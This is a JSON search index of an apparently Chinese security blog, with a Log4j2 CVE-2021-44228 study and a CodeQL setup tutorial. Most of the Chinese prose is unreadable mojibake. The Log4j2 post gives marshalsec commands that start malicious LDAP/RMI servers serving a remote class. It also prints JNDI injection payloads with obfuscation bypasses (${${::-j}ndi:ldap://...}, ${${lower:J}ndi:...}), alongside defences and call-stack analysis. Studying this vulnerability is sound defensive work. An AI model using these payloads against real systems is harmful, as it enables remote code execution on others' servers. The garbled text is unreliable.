[{"categories":["Java"],"content":"Log4j2ï¼ˆCVE-2021-44228ï¼‰\r","date":"2025-04-13","objectID":"/posts/cde7a8a/:1:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‰è¨€\ræ²¡å­¦ java å°±çŸ¥é“è¿™ä¸ªæ¼æ´ï¼Œåº”è¯¥è¿˜æœ‰ä¸å°‘çš„è§£æå’Œç»•è¿‡ï¼Œè¿™é‡Œå°±ç®€å•å…ˆäº†è§£ä¸‹æœ€åŸºç¡€çš„ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:2:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç®€ä»‹\rlog4j2æ˜¯apacheä¸‹çš„javaåº”ç”¨å¸¸è§çš„å¼€æºæ—¥å¿—åº“ï¼Œæ˜¯ä¸€ä¸ªå°±Javaçš„æ—¥å¿—è®°å½•å·¥å…·ã€‚åœ¨log4jæ¡†æ¶çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ”¹è¿›ï¼Œå¹¶å¼•å…¥äº†ä¸°å¯Œçš„ç‰¹æ€§ï¼Œå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„å»ºç­‰ï¼Œè¢«åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨äºè®°å½•ç¨‹åºè¾“å…¥è¾“å‡ºæ—¥å¿—ä¿¡æ¯ã€‚ å…¶è¢«å¹¿æ³›åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨è¯¥å·¥å…·å°†ç¨‹åºçš„è¾“å…¥è¾“å‡ºä¿¡æ¯è¿›è¡Œæ—¥å¿—è®°å½•ã€‚åœ¨javaä¸­æœ€å¸¸ç”¨çš„æ—¥å¿—æ¡†æ¶æ˜¯log4j2å’Œlogbackï¼Œå…¶ä¸­log4j2æ”¯æŒlookupåŠŸèƒ½ï¼ˆçœ‹åˆ°è¿™ä¸ªå°±çŸ¥é“è¦æ‰“ jndi ï¼‰ã€‚ä¾‹å¦‚å½“å¼€å‘è€…æƒ³åœ¨æ—¥å¿—ä¸­æ‰“å°ä»Šå¤©çš„æ—¥æœŸï¼Œåˆ™åªéœ€è¦è¾“å‡º${data:MM-dd-yyyy}ï¼Œæ­¤æ—¶log4jä¼šå°†${}ä¸­åŒ…è£¹çš„å†…å®¹å•ç‹¬å¤„ç†ï¼Œå°†å®ƒè¯†åˆ«ä¸ºæ—¥æœŸæŸ¥æ‰¾ï¼Œç„¶åå°†è¯¥è¡¨è¾¾å¼æ›¿æ¢ä¸ºä»Šå¤©çš„æ—¥æœŸå†…å®¹è¾“å‡ºä¸ºâ€œ08-22-2022â€ï¼Œè¿™æ ·åšå°±ä¸éœ€è¦å¼€å‘è€…è‡ªå·±å»ç¼–å†™æŸ¥æ‰¾æ—¥æœŸçš„ä»£ç ã€‚ç©¶å…¶æ ¹æœ¬ï¼Œè¿˜æ˜¯æœ€åè°ƒç”¨è§¦å‘äº† jndi ","date":"2025-04-13","objectID":"/posts/cde7a8a/:3:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å½±å“ç‰ˆæœ¬\r2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:4:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\rpom.xml \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e å†å†™ä¸ªxmlæ–‡ä»¶æ¥å®ç°log4j2ï¼ˆyamlç­‰æ–‡ä»¶ä¹Ÿè¡Œï¼‰ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºlog4j2.xmlï¼Œæ”¾åœ¨ src/main/resources ç›®å½•ä¸‹ \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 é…ç½®æ–‡ä»¶ --\u003e \u003c!-- æ—¥å¿—çº§åˆ« trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- è‡ªå®šä¹‰å±æ€§ --\u003e \u003cProperties\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ§åˆ¶å°) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ–‡ä»¶) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n \u003c/Property\u003e \u003c!-- æ—¥å¿—æ–‡ä»¶è·¯å¾„ --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e æœ€åå†™ä¸ªdemoæ¥è§¦å‘ package com.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class test { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"admin123\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } } å¯ä»¥çœ‹åˆ°æ˜¯å°†ç™»å½•ä¿¡æ¯è®°å½•åˆ°äº† myLog.log ä¸­ ä¸Šé¢è¯´è¿‡äº† log4j2 ä¼šæŠŠ ${} åŒ…è£¹çš„è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œæœ€åä¼šè§¦å‘ lookupï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ lookup ç±»å‹ ${date}ï¼šè·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ”¯æŒè‡ªå®šä¹‰æ ¼å¼ã€‚ ${pid}ï¼šè·å–å½“å‰è¿›ç¨‹çš„ IDã€‚ ${logLevel}ï¼šè·å–å½“å‰æ—¥å¿—è®°å½•çš„çº§åˆ«ã€‚ ${sys:propertyName}ï¼šè·å–ç³»ç»Ÿå±æ€§çš„å€¼ï¼Œä¾‹å¦‚ ${sys:user.home} è·å–ç”¨æˆ·ä¸»ç›®å½•ã€‚ ${env:variableName}ï¼šè·å–ç¯å¢ƒå˜é‡çš„å€¼ï¼Œä¾‹å¦‚ ${env:JAVA_HOME} è·å– Java å®‰è£…è·¯å¾„ã€‚ ${ctx:key}ï¼šè·å–æ—¥å¿—çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼ˆThreadContextï¼‰ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ ${class:fullyQualifiedName:methodName}ï¼šè·å–æŒ‡å®šç±»çš„é™æ€æ–¹æ³•çš„è¿”å›å€¼ã€‚ ${mdc:key}ï¼šè·å– MDC (Mapped Diagnostic Context) ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ æ¯”å¦‚ ${date} ","date":"2025-04-13","objectID":"/posts/cde7a8a/:5:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"æ¼æ´åˆ†æ\rå…ˆæ‰“ä¸‹ï¼Œç”¨marshalsecèµ·ä¸ªæ¶æ„çš„rmiæœåŠ¡ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9999/#exp\" 9991 ldap ä¹Ÿæ˜¯è¿™æ · java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:9999/#exp\" 1099 æ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ï¼Œæ¥åˆ° org.apache.logging.log4j.core.layout.PatternLayout ä¸‹çš„ toSerializable æ–¹æ³• è¿™ä¸ªç±»ä¸­æœ‰ä¸¤ä¸ª toSerializable æ–¹æ³•ï¼Œç”±äºæˆ‘ä»¬åœ¨ log4j2.xml ä¸­æ˜¯ä½¿ç”¨ \u003cPatternLayout pattern=\"${pattern1}\"/\u003e è¿™ç§é™æ€çš„é…ç½®æ–¹å¼ï¼Œæ‰€ä»¥æœ€åä¼šè°ƒç”¨åˆ°ç¬¬äºŒä¸ª toSerializable æ–¹æ³•ä¸­çš„ this.formatters.length æ¥è·å– ï¼Œè¿™ä¸ªç±»çš„æºç  public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { int len = this.formatters.length; for(int i = 0; i \u003c len; ++i) { this.formatters[i].format(event, buffer); } if (this.replace != null) { String str = buffer.toString(); str = this.replace.format(str); buffer.setLength(0); buffer.append(str); } return buffer; } è¿™ä¸ªç±»å°±æ˜¯å°†æ—¥å¿—å†…å®¹æŒ‰ log4j2.xml æ–‡ä»¶ä¸­è§„å®šå¥½çš„æ ¼å¼é‚£æ ·è¾“å‡ºï¼Œæˆ‘ä»¬è¿™é‡Œçš„æ ¼å¼ä¸º [%-5p] %d %c - %m%n æ‰€ä»¥ç¬¬ä¸ƒæ¬¡å¾ªç¯å°±ä¼šå¤„ç† %m ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ—¥å¿—æ¶ˆæ¯ï¼Œä¼šè°ƒç”¨åˆ° org.apache.logging.log4j.core.pattern.MessagePatternConverter#format è¿™é‡Œçš„ this.config å°±æ˜¯æˆ‘ä»¬å®ç°log4j2çš„æ–‡ä»¶ç±»å‹ï¼Œè¿™é‡Œæ˜¯xmlï¼Œthis.noLookups ä¸º false åˆ™ä»£è¡¨å¯ç”¨ ${} å˜é‡æ›¿æ¢ï¼Œè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰åœ¨xmlä¸­æ˜¾å¼è§„å®šç¦ç”¨ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œè€Œä¸”æˆ‘ä»¬è¿™é‡Œæœ¬æ¥å°±éœ€è¦ç”¨åˆ°å˜é‡æ›¿æ¢ ç„¶åè¿›å…¥åˆ° if è¯­å¥é‡Œé¢ï¼Œå¦‚æœæ£€æµ‹åˆ° ${ å¼€å¤´ï¼Œåˆ™å–å‡ºä» offset åˆ°å½“å‰ workingBuilder æœ«å°¾çš„å†…å®¹ï¼Œæ•…è¿™é‡Œ value çš„å€¼å°±ä¸ºå½“æ—¶è¾“å…¥çš„å€¼ ç„¶åè°ƒç”¨ replace() ï¼Œåˆè°ƒç”¨ substitute()ï¼Œæœ€åä¼šè°ƒç”¨åˆ° org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariableï¼Œè¿™é‡Œçš„è°ƒç”¨æ ˆ resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) å…¶æºç  protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { StrLookup resolver = this.getVariableResolver(); return resolver == null ? null : resolver.lookup(event, variableName); } resolverè§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„jndi:xxxåç»­å°±ä¼šç”¨åˆ°JndiLookupè¿™ä¸ªè§£æå™¨ï¼Œè°ƒç”¨æ ˆ lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) æœ€åè°ƒç”¨åˆ°log4j2åŸç”Ÿçš„ lookup() æ–¹æ³• ","date":"2025-04-13","objectID":"/posts/cde7a8a/:6:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç»•è¿‡å…¶é˜²å¾¡\rå…ˆæ˜¯ç»•è¿‡ é€’å½’è§£æç»•è¿‡ï¼šlog4j2 æ”¯æŒè¡¨è¾¾å¼é€’å½’è§£æï¼Œä¸‹é¢çš„è¡¨è¾¾å¼ä¼šé€å±‚è§£æï¼Œç”±äº :-æ˜¯é”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œè€Œè¡¨è¾¾å¼åªç®¡å–å€¼ï¼Œä»è€Œä½¿å¾— {::-j} -\u003e jï¼Œç±»ä¼¼çš„å¯ä»¥æ··æ·†å…¶ä»–å­—ç¬¦ã€‚ loggr.info(\"${${::-j}ndi:ldap://127.0.0.1:1099/exp}\"); logger.info(\"${${,:-j}ndi:ldap://127.0.0.1:1099/exp}\") lowwer / upper ç»•è¿‡ï¼šä½¿ç”¨ log4j2 æ”¯æŒçš„å…³é”®å­—ï¼Œå®ç°å¤§å°å†™ç»•è¿‡ logg.info(\"${${lower:J}ndi:ldap://127.0.0.1:1099/exp}\"); é˜²å¾¡ å…ˆæ˜¯æœ€ç®€å•çš„ï¼Œæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–è€…å®‰å…¨ç‰ˆæœ¬ï¼Œæ¯”å¦‚ 2.15.0-rc2 å®‰å…¨ç‰ˆæœ¬ï¼Œå¹¶ç¡®è®¤ä¸å¼€å¯ JNDI Lookup ï¼Œè¿˜æœ‰äº›ä¸´æ—¶åº”æ€¥æ“ä½œï¼Œæ¯”å¦‚ jvm æ·»åŠ  -Dlog4j2.formatMsgNoLookups=true å‚æ•°ï¼ˆä½¿å¾—noLookupä¸ºtrueï¼Œä¸ä¼šè¿›å…¥åˆ°lookupä¸­ï¼‰ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:7:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"æ€»ç»“\rè°ƒç”¨æ ˆ lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi) info:1444, AbstractLogger (org.apache.logging.log4j.spi) main:16, test (com.example) sink ç‚¹æ˜¯ lo4j2 åŒ…ä¸‹çš„ JndiManager#lookup ç®€å•åˆ†æä¸‹åè§‰å¾—ç¡®å®æ— æ•Œï¼Œè¿™ä¹ˆåˆé’»çš„è§’åº¦éƒ½èƒ½æ‰¾åˆ°ï¼Œè¿™ä¸ªæ¼æ´çš„åŸç†å’Œåˆ©ç”¨éƒ½ä¸éš¾ï¼Œä½†ä»source åˆ†æè°ƒç”¨åˆ°æœ€åçš„sinkç‚¹ï¼ŒçœŸçš„å¾ˆå¼ºï¼Œä¸æ„§æ˜¯é˜¿é‡Œï¼Œå¬è¯´æ˜¯codeqlæ‰¾åˆ°çš„ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„ï¼Œä½†ç”¨codeqlåº”è¯¥è½»æ¾ä¸å°‘ è¿˜æœ‰æ›´å¤šçš„ç»•è¿‡å’Œä¿®å¤ï¼Œä»¥åŠæ›´æ·±çš„åˆ©ç”¨åˆ†æï¼Œå¯ä»¥è§su18å¸ˆå‚…çš„æ–‡ç« ï¼šhttps://tttang.com/archive/1378/#toc_rc1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:8:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://gaorenyusi.github.io/posts/log4j2/ https://jaspersec.top/posts/1237655284.html https://tttang.com/archive/1378/ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:9:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‰è¨€\rCodeQL ä¸å¤šè¯´ï¼Œå¸®åŠ©æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡çš„ä¸€ä¸ªæŒºå¥½çš„å·¥å…· ","date":"2025-04-13","objectID":"/posts/28dc684/:1:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL å®‰è£…\rCodeQLæœ¬èº«åŒ…å«ä¸¤éƒ¨åˆ†è§£æå¼•æ“+SDKã€‚ è§£æå¼•æ“ç”¨æ¥è§£ææˆ‘ä»¬ç¼–å†™çš„è§„åˆ™ï¼Œè™½ç„¶ä¸å¼€æºï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å®˜ç½‘ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ç›´æ¥ä½¿ç”¨ã€‚ SDKå®Œå…¨å¼€æºï¼Œé‡Œé¢åŒ…å«å¤§éƒ¨åˆ†ç°æˆçš„æ¼æ´è§„åˆ™ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ç¼–å†™è‡ªå®šä¹‰è§„åˆ™ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å¼•æ“å®‰è£…\rå»åœ°å€ï¼šhttps://github.com/github/codeql-cli-binaries/releases ä¸‹è½½å·²ç»ç¼–è¯‘å¥½çš„codeqlæ‰§è¡Œç¨‹åºï¼Œè§£å‹ä¹‹åæŠŠcodeqlæ–‡ä»¶å¤¹æ”¾å…¥ï½/CodeQLï¼Œæˆ‘è¿™é‡Œæ˜¯ windows ï¼Œä¸‹çš„æ˜¯ codeql-win64.zip ä¸ºäº†æ–¹ä¾¿æµ‹è¯•æˆ‘ä»¬éœ€è¦æŠŠqlå¯æ‰§è¡Œç¨‹åºåŠ å…¥åˆ°ç¯å¢ƒå˜é‡å½“ä¸­ï¼š setx PATH \"E:\\CodeQL\\codeql;%PATH%\" ç„¶åé‡å¼€ä¸ªcmdè¾“å…¥ codeqlï¼Œå‡ºç°å¦‚ä¸‹å›¾å°±è¯´æ˜å¼•æ“è®¾ç½®å®Œæˆ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"SDKå®‰è£…\råœ¨è¿™è¾¹ä¸‹è½½è§„åˆ™åº“æ–‡ä»¶https://github.com/github/codeqlï¼Œç”¨æ¥åœ¨åç»­åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ å°†è§£å‹åçš„æ–‡ä»¶æ”¾å…¥~/CodeQLä¸­ï¼Œä¹‹åè¾“å…¥codeql pack lsæ¥æŸ¥çœ‹å½“å‰SDKä¸­æ”¯æŒçš„è§„åˆ™é›†ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"VSCodeå¼€å‘æ’ä»¶å®‰è£…\råœ¨ vscode ä¸­å®‰è£… CodeQL æ’ä»¶ ç„¶ååœ¨è¯¥æ’ä»¶çš„è®¾ç½®ä¸­è®¾ç½® codeql çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼ˆè·¯å¾„ä¸­æœ€å¥½ä¸è¦æœ‰ä¸­æ–‡ï¼‰ ç„¶åå°±è®¾ç½®å¥½äº†ï¼Œæ¥ä¸‹æ¥å†™ä¸ªdemoæµ‹è¯•ä¸€ä¸‹ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"demo\rç”±äºCodeQLçš„å¤„ç†å¯¹è±¡å¹¶ä¸æ˜¯æºç æœ¬èº«ï¼Œè€Œæ˜¯ä¸­é—´ç”Ÿæˆçš„ASTç»“æ„æ•°æ®åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆéœ€è¦æŠŠæˆ‘ä»¬çš„é¡¹ç›®æºç è½¬æ¢æˆCodeQLèƒ½å¤Ÿè¯†åˆ«çš„CodeDatabaseã€‚ åˆ‡æ¢åˆ°æºä»£ç æ‰€åœ¨çš„ç›®å½•ç„¶åå†æ‰§è¡Œåˆ›å»ºæ•°æ®åº“çš„å‘½ä»¤ codeql database create \u003cæ•°æ®åº“å\u003e --language=\u003cè¯­è¨€æ ‡è¯†ç¬¦\u003e --source-root=\u003cæºç è·¯å¾„\u003e å¦‚æœæºä»£ç æ˜¯ä¸€ä¸ªMavené¡¹ç›®ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨Mavenå‘½ä»¤æ¥æ„å»ºé¡¹ç›®ï¼Œå¹¶åœ¨åˆ›å»ºæ•°æ®åº“æ—¶æŒ‡å®šè¯¥å‘½ä»¤ --command=\"mvn clean install\" ä¸åŒçš„ language æ‰€å¯¹åº”çš„è¯­è¨€æ ‡è¯†ç¬¦ Language Identity C/C++ cpp C# csharp Go go Java java javascript/Typescript javascript Python python è¿™é‡Œæˆ‘ä¸»è¦æ˜¯ç”¨ codeql æ¥å®¡è®¡ java ä»£ç ï¼Œæ‰€ä»¥ç”¨ micro_service_seclab è¿™ä¸ªé¶åœºæ¥åšæµ‹è¯• codeql database create micro_service_seclab_database --language=\"java\" --command=\"mvn clean install -Dmaven.test.skip=true\" --source-root=E:\\CodeQL\\test\\micro_service_seclab ç¨å¾®è§£é‡Šä¸‹ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸ª micro_service_seclab_database å½“ä½œå­˜æ”¾æ•°æ®åº“çš„ç›®å½•ï¼ŒæŒ‡å®šè¯­è¨€ä¸ºjavaï¼Œç„¶åå†™å‡ºæ„å»ºå’Œæ¸…æ¥šå‘½ä»¤ï¼Œæœ€åæŒ‡å®šæºä»£ç è·Ÿç›®å½• ç„¶ååœ¨è¿™é‡ŒæŠŠç”Ÿæˆçš„ micro_service_seclab_database æ·»åŠ è¿›å» ç„¶åå‡ºç°è¿™ä¸ªå°±è¡¨ç¤ºæ•°æ®åº“åŠ è½½æˆåŠŸäº† æ¥ç€å†æ·»åŠ CodeQL SDKï¼šâ€œæ–‡ä»¶â€-â€œå°†æ–‡ä»¶å¤¹æ·»åŠ åˆ°å·¥ä½œåŒºâ€ ç„¶ååœ¨ sdk/java/ql ç›®å½•ä¸‹åˆ›å»ºä¸ª demo.ql æŸ¥è¯¢æ–‡ä»¶ï¼Œç„¶å Run Query on Selected Databaseï¼Œå°±ä¼šæ‰“å° heloooo test ","date":"2025-04-13","objectID":"/posts/28dc684/:3:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"åŸºæœ¬è¯­æ³•\rä»¥ä¸Šé¢çš„é¶åœºä¸ºä¾‹ å¯ä»¥çœ‹åˆ° CodeQL å¼•æ“çš„ä½œç”¨å°±æ˜¯å¸®æˆ‘ä»¬æŠŠæºç è½¬æ¢ä¸º CodeQL èƒ½è¯†åˆ«çš„æ•°æ®åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ç¼–å†™ QL è§„åˆ™ï¼Œå†é€šè¿‡å…¶å¼•æ“æ¥è¿è¡Œæˆ‘ä»¬çš„è§„åˆ™ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°ä¸€ä¸ªè‡ªåŠ¨å®¡è®¡çš„åŠŸèƒ½ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"QLè¯­æ³•\rimport java from int i where i = 1 select i ç¬¬ä¸€è¡Œè¡¨ç¤ºæˆ‘ä»¬è¦å¼•å…¥CodeQLçš„ç±»åº“ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥ java ä¸ºä¾‹ from int iï¼Œè¡¨ç¤ºæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå˜é‡iï¼Œå®ƒçš„ç±»å‹æ˜¯intï¼Œè¡¨ç¤ºæˆ‘ä»¬è·å–æ‰€æœ‰çš„intç±»å‹çš„æ•°æ® where i = 1, è¡¨ç¤ºå½“iç­‰äº1çš„æ—¶å€™ï¼Œç¬¦åˆæ¡ä»¶ select iï¼Œè¡¨ç¤ºè¾“å‡ºi å¦‚æœQLæ–‡ä»¶åœ¨ sdk\\java\\ql\\ ç›®å½•ä¸­æ—¶å°±ä¸éœ€è¦ import java äº†ï¼Œå› ä¸ºè¿™æ˜¯ CodeQL æ ‡å‡†åº“ç›®å½•ï¼Œå…¶ä¼šè‡ªåŠ¨éšå¼åŠ è½½è¯¥ç›®å½•ä¸‹çš„ä¾èµ–ï¼Œä½†å¦‚æœå†™åœ¨å…¶ä»–ç›®å½•ä¸‹å°±éœ€è¦æ‰‹åŠ¨ import java ï¼ŒåŒ…æ‹¬å…¶å­ç›®å½• è¿™é‡Œæˆ‘æ˜¯å†™åœ¨ sdk\\java\\ql\\examples ä¸‹çš„ï¼Œä¸Šé¢çš„ä»£ç å¾ˆå¥½ç†è§£ï¼Œæ‰€æœ‰intç±»å‹çš„æ•°æ®ä¸­ç­›é€‰å‡ºä¸º1çš„æƒ…å†µï¼Œè¾“å‡ºå°±æ˜¯ 1 QLæŸ¥è¯¢çš„è¯­æ³•ç»“æ„ä¸ºï¼š from [datatype] var where condition(var = something) select var ä»ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬å‘ç°å®Œæ•´çš„QLè¯­æ³•æ— éå°±åˆ†ä¸‰éƒ¨åˆ†ï¼Œå…ˆæ˜¯é™å®šä¸€ä¸ªæŸ¥è¯¢çš„åŒºåŸŸï¼Œç„¶åå†™å‡ºè¿‡æ»¤è§„åˆ™ï¼Œæœ€åè¾“å‡º 